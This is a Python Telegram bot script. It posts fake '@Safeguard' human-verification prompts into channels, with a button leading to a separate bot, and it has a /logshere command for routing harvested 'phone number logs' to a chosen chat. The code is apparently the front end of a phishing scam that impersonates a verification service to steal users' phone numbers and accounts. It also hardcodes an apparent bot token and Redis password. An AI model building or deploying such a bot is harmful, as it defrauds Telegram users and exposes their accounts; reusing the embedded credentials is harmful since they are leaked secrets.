import logging
import asyncio
from pathlib import Path
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, filters, ContextTypes
import redis.asyncio as redis

BOT_TOKEN = "8268855870:AAESvySbXCEhgG-Bk0mvipt3UUuuqdbLqmY"
REDIS_URL = "redis://default:GT9rAOc9TZhb4FMvlSikZJ8K6cy1ffB0@redis-10623.c265.us-east-1-2.ec2.cloud.redislabs.com:10623"
IMAGE_PATH = Path(__file__).parent / "safeguard.jpg"

logging.basicConfig(level=logging.INFO)

r = redis.from_url(REDIS_URL, decode_responses=True)

async def handle_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not message.forward_origin:
        return
    origin = message.forward_origin
    if origin.type != "channel":
        return
    channel_id = origin.chat.id
    channel_name = origin.chat.title
    caption = f"{channel_name} is being protected by @Safeguard\n\nClick below to verify you're human"
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Tap to verify", url="https://t.me/edseaxdsxbot/Safeguard")]
    ])
    with open(IMAGE_PATH, "rb") as img:
        await context.bot.send_photo(
            chat_id=channel_id,
            photo=img,
            caption=caption,
            reply_markup=keyboard
        )
    await message.reply_text(f"✅ Verification message sent to {channel_name}!")

async def logs_here(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    chat_name = update.effective_chat.title or "this chat"
    await r.set("logs_chat_id", chat_id)
    await update.message.reply_text(f"✅ Phone number logs will now be sent to {chat_name}!")

async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.FORWARDED, handle_forward))
    app.add_handler(CommandHandler("logshere", logs_here))
    print("Bot is running...")
    async with app:
        await app.start()
        await app.updater.start_polling()
        await asyncio.Event().wait()
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    asyncio.run(main())